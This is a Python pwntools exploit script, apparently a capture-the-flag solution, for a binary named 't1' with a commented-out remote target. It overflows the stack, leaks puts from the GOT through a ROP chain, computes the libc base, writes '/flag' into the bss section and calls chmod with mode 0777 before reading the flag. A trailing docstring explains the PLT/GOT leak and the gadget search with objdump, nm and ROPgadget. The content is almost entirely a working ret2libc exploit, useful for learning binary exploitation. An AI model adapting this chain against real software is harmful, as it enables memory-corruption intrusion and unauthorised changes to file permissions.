import time
import os
import random
from pwn import *

binary_path = './t1'
debug = False
p = None

if debug:
    p = process(binary_path)
    gdb.attach(p, '''
    b *main+355
    ''')
else:
    #host, port = ('mc.ax', 31077)
    #p = remote(host, port)
    p = process(binary_path)

# searching address of function in the ELF
binary = ELF(binary_path)
puts_plt = p64(binary.symbols['puts']) # getting puts address from @plt
puts_got = p64(0x40110b + 0x2f1d) # puts rip when in plt + offset of indirect jmp, should point to puts inside libc
start_addr = p64(binary.symbols['_start']) # getting _start main

# searching for ROP gadgets
binary_rop = ROP(binary_path)
pop_rdi = p64(binary_rop.rdi.address)
pop_rax = p64(binary_rop.rax.address)
pop_rsi = p64(binary_rop.rsi.address)

##### STAGE 1 - LEAKING LIBC PUTS ADDRESS #######
# overflowing
overflow_until_ret = b'A' * cyclic_find('faaaaaaa', n=8)
xpl = b''
xpl += overflow_until_ret

# leaking puts libc address by using puts
xpl += pop_rdi + puts_got # putting in rdi the addrs for puts from the got, the libc resolved guy
xpl += puts_plt # puts plt addrs used to print the address in puts_got, leaking puts from libc

xpl += start_addr # calling _start to rerun the binary and overflow again with something more useful
p.sendline(xpl)

# getting line by line until the program exits a first time
# because after the first exit, he's going to call main again 
# and wait for input (so, my recvall was waiting forever)
line = p.recvline()
while b'Exiting!' not in line:
    print(line)
    line = p.recvline()
libc_leak = p.recvline()

# cleaning
libc_puts_addr = libc_leak.split(b'\n')[-2]
# inserting the absent null bytes because puts wont print them
libc_puts_addr = libc_puts_addr + b'\0\0'
# unpacking with pwntools
libc_puts_addr = u64(libc_puts_addr)

##### STAGE 2 - CALCULATING LIBC BASE ADDRESS AND USEFUL SHIT #####
libc_base_addr = libc_puts_addr - 0x875a0
libc_chmod_addr = libc_base_addr + 0x110cd0
libc_write_rdi_to_rax = libc_base_addr + 0x0009d24f # gadget for writing rdi to [rax]

##### STAGE 3 - PWNING AWAY #####
# i need to write /flag somewhere and get the address of this string
# to pass as argumento to chmod
# the binary has some position depedent regions, we can check by doing this:

# cat /proc/$(pgrep t1)/maps
# 00400000-00401000 r--p 00000000 fd:01 1308192                            /home/b/pwn/t1
# 00401000-00402000 r-xp 00001000 fd:01 1308192                            /home/b/pwn/t1
# 00402000-00403000 r--p 00002000 fd:01 1308192                            /home/b/pwn/t1
# 00403000-00404000 r--p 00002000 fd:01 1308192                            /home/b/pwn/t1
# ----->  00404000-00405000 rw-p 00003000 fd:01 1308192                            /home/b/pwn/t1
# 0232b000-0234c000 rw-p 00000000 00:00 0                                  [heap]

# i think this is where the bss section is, the space for variables and etc
# we can write 8 bytes beginning in 0x00404000 and point to this address to write
# the string and after that, call chmod

chmod_777 = p64(0x1FF) # 0777
bss_start_section = p64(0x404000)

# writing the string /flag
xpl = b''
xpl += overflow_until_ret
xpl += pop_rax + bss_start_section # putting in rax the address for writing the string /flag
xpl += pop_rdi + b"/flag\0\0\0" # padding with nulls to write the 8 bytes
xpl += p64(libc_write_rdi_to_rax)

# calling chmod using the address where /flag was written
xpl += pop_rdi + bss_start_section
xpl += pop_rsi + chmod_777
xpl += p64(libc_chmod_addr)
p.sendline(xpl)

os.system('cat /flag')

"""
- Stack is randomized (ASLR)
- Stack is not executable
- PIE disabled

- We can use a plt stub(Procedure Linkage Table (?)) address to use functions from libc
  available in the binary because is not randomized
    - JMP to PLT to execute that function
    - PLT has a indirect jump who points to GOT entries (Global Offset Table)
    - Betwen PLT and GOT we have a RESOLVER, a guy who feed the memory binary with LIBC addresses
    - The GOT entries are initiliazed only once (?)

- Steps for exploit
    - Get libc version with: ldd ./binary -> libc-2.31.so
    - Get PLT puts address (1) by using objdump in the binary (we're going to use to print addresses of libc): p64(binary.symbols['puts']) = 0x401100
    - Get the indirect jmp address (2) + offset from PLT stub of puts using objdump too: p64(0x40110b + 0x2f1d)
        ------> (1) 0000000000401100 <puts@plt>:
        401100:	f3 0f 1e fa          	endbr64 
        401104:	f2 ff 25 1d 2f 00 00 	bnd jmp QWORD PTR [rip+0x2f1d] (OFFSET) <---------
        ------> (2) 40110b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]
        - Because when the instrunction in 0x401104 are going to be executed, RIP will be pointing to the next one 0x40110b
        - This sum of addresses will result in the puts libc address!

    - Pass the indirect jmp address (2) as argument to the PLT puts address (1) in a ROP chain
      so this puts are going to leak the memory address of puts in libc
    - With the leaked memory address (3) we can calculate any function in libc
    - Using the version of libc we get with ldd, run: nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep puts
        - Example of output: 
            [...]
            00000000000875a0 W puts (4)
            [...]
        - Because we leaked the puts, we calculate the base address of libc like this:
            - libc_base_addrs = leaked_address (3) - 0x875a0 (4)
    - With the libc_base_addrs we can calculate the address of any libc_function doing libc_any_addr = libc_base_addr - desired_offset
        - nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep sleep
            [...]
            00000000000e5f40 W sleep
            [...]
        libc_sleep_addrs = libc_base_addr + 0xe5f40

    - After getting any libc function, we should setup the function call. There are infinite gadget in libc we can use now:
        - ROPgadget --binary /usr/lib/x86_64-linux-gnu/libc-2.31.so --filter "mov qword"
        

"""
